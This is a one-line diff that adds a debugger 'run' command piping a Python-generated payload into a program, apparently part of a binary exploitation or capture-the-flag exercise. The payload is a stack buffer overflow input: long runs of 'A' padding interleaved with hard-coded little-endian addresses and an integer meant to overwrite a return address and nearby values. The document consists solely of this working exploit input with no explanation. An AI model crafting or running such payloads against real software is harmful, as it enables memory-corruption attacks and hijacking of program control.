@@ -1,0 +1,1 @@
+run <<< $(python -c "print('A'*398 + '\xe4\x88\xff\x43' + 'A'*400 + '\x30\xb3\xe5\xe0' + 'A'*4 + '\x01\x00\x00\x00')")
